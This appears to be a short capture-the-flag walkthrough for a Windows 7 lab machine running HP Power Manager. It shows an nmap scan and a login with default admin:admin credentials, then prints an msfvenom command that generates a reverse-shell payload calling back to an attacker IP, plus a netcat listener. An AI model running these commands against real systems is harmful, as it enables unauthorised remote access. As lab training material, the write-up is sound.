#Pwned! 
```IP
192.168.168.45
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.168.45 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 125 GoAhead WebServer    
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.232.45/index.asp
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125    
|_ssl-date: 2024-11-25T10:27:43+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa                   
| Public Key bits: 2048 
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-08-02T01:53:02
| Not valid after:  2025-02-01T01:53:02   
| MD5:   46cc:1740:d4ec:3b3c:9c49:6e7e:6e71:1862
| SHA-1: 6789:694b:629e:5eaa:70d0:cc11:4689:be88:b80e:2e76 
| -----BEGIN CERTIFICATE-----                         
| MIICzjCCAbagAwIBAgIQQinb/aJsXpxEgUApfOfPVDANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVrZXZpbjAeFw0yNDA4MDIwMTUzMDJaFw0yNTAyMDEwMTUzMDJa
| MBAxDjAMBgNVBAMTBWtldmluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAsloOiWcNHuRoEeJ57MC9WJzIfk6MTKe/L4l4+kD0aBgTCDMYnBmJfh6C5Df2
| 5VplIeoCWoeMwsRQNbs5N+Q1Xb6BYQQcvCgA4mtHLXVZ8BZF+YPsV8TWOb5pIzXq
| GDOWndUr7/uDRHzjAyPnABcuGfMt0e+0fFda7tSS8MyZzZl77t/rQwCqaWXmFyHT
| tVzYoN/EzI403U5DpreQ5YmjKWrvE4jP8M5ljdxYhg/thwhSn+ZrC34otfXDl/Mg
| Qsr/oigprgfN1eCL3/LezmzjPhN5Ivc3WH2axxtU4wmhNCl9akvKIIAZT073b1H6
| 0NEop29dujiQgFeq/nXQv83wPQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAAIJar8HiJFoQEFSNrPf
| SAKXxnYoxvGgbyQvYMsNfpyNs8ye9nhY1ySd5ImbQR4A4XMOu3SdJJBb9zAnU/ud
| oW9O/HX11Em+P8yEeQz5geD+KW6+/VKPoPgUW7ZEFsT/wj2a0df6Tyw56xNU66qi
| 7RaP1T9XZwJgOWE0reokQbQvqkk/+hl6Av+Mf0+ecm2lh153Km92NSgci/xWZRqQ
| lcfRhQGEx9YAxsj+OkRRv0eyQlxJwqHO+Mpzd1We/IqT1HL0GxqvEaF5NoCKJ1yR
| CKzi/OqCB67jEr4lFrtYvrVue4DH4QDkuSuOj4kIAdBi8T9IesOicNTANAKwDft3
| YGc=       
|_-----END CERTIFICATE-----                           
| rdp-ntlm-info:                                      
|   Target_Name: KEVIN                       
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin                    
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600               
|_  System_Time: 2024-11-25T10:27:35+00:00
3573/tcp  open  tag-ups-1?         syn-ack ttl 125
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
```

## HTTP 80
admin:admin
we are in
HP Power Manager 4.2 (Build 7)
# Exploitation
https://www.exploit-db.com/exploits/10099
```
msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.237 LPORT=443
```
```
nc -lvp 443
```

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

